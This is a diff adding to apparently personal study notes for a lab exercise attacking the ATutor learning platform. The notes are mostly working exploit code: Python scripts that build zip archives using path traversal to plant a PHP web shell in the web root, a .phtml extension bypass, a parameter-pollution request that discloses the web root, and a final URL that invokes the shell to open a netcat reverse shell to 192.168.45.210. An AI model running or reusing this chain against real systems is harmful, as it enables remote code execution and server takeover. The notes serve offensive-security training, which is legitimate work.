@@ -456,3 +456,163 @@ if __name__ == "__main__":
 ```
 python3 atutor_login.py atutor 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e
 ```
+
+```
+grep -ir "IMS manifest file is missing" /var/www/html/ATutor --color
+grep -ir "addError(" /var/www/html/ATutor --color
+grep -ir "NO_IMSMANIFEST" /var/www/html/ATutor --color
+```
+
+```
+#!/usr/bin/python
+import zipfile
+import io
+#from io import StringIO
+
+def _build_zip():
+    #f = StringIO()
+    f = io.BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    z.writestr('poc/poc.txt', str.encode('offsec'))
+    z.writestr('shell.php.txt', str.encode('<?php system($_GET[\'cmd\']); ?>'))
+    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
+    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
+    z.close()
+    zip = open('poc1.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+_build_zip()
+
+```
+
+
+```
+sudo find / -name "poc.txt"
+```
+
+##### Escaping Jail
+
+```
+#!/usr/bin/python
+import zipfile
+import io
+#from io import StringIO
+
+def _build_zip():
+    #f = StringIO()
+    f = io.BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    #z.writestr('poc/poc.txt', str.encode('offsec'))
+    z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
+    z.writestr('shell.php.txt', str.encode('<?php system($_GET[\'cmd\']); ?>'))
+    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
+    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+_build_zip()
+```
+
+##### Disclosing Web Root
+
+A typical example is the abuse of the display_errors1 PHP settings
+
+A good example of how to leverage the display_errors misconfiguration is by sending a GET request with arrays injected as parameters. This technique, known as Parameter\ Pollution or Parameter\ Tampering relies on the fact that most back-end code does not expect arrays as input data, when that data is retrieved from a HTTP request. For example, the application may directly be passing the $GET["some_parameter"] variable into a function that is expecting a string data type. However, since we can change the data type of the some_parameter from string to an array, we can trigger an error.
+
+
+```
+GET /ATutor/browse.php?access=&search[]=test&include=all&filter=Filter HTTP/1.1
+Host: target
+```
+
+http://php.net/manual/en/errorfunc.configuration.php#ini.display-errors
+
+
+
+```
+find /var/www/html/ -type d -perm -o+w
+```
+
+```
+#!/usr/bin/python
+import zipfile
+import io
+#from io import StringIO
+
+def _build_zip():
+    #f = StringIO()
+    f = io.BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    #z.writestr('poc/poc.txt', str.encode('offsec'))
+    #z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
+    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', str.encode('offsec'))
+    z.writestr('shell.php.txt', str.encode('<?php system($_GET[\'cmd\']); ?>'))
+    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
+    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+_build_zip()
+```
+##### Bypassing File extension
+
+Use .phtml
+
+```
+#!/usr/bin/python
+import zipfile
+import io
+#from io import StringIO
+
+def _build_zip():
+    #f = StringIO()
+    f = io.BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    #z.writestr('poc/poc.txt', str.encode('offsec'))
+    #z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
+    #z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', str.encode('offsec'))
+    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml',  str.encode('<?php phpinfo(); ?>'))
+    z.writestr('shell.php.txt', str.encode('<?php system($_GET[\'cmd\']); ?>'))
+    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
+    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+_build_zip()
+```
+
+```
+#!/usr/bin/python
+import zipfile
+import io
+#from io import StringIO
+
+def _build_zip():
+    #f = StringIO()
+    f = io.BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    #z.writestr('poc/poc.txt', str.encode('offsec'))
+    #z.writestr('../../../../../tmp/poc/poc.txt', str.encode('offsec'))
+    #z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.txt', str.encode('offsec'))
+    z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml',  str.encode('<?php phpinfo(); ?>'))
+    z.writestr('../../../../../var/www/html/ATutor/mods/poc/shell.phtml', str.encode('<?php system($_GET[\'cmd\']); ?>'))
+    #z.writestr('imsmanifest.xml', str.encode('<validTag></validTag>'))
+    z.writestr('imsmanifest.xml', str.encode('invalid xml!'))
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+_build_zip()
+```
+
+```
+http://atutor/ATutor/mods/poc/shell.phtml?cmd=`nc%20-nv%20192.168.45.210%204444%20-e%20/bin/bash`
+```
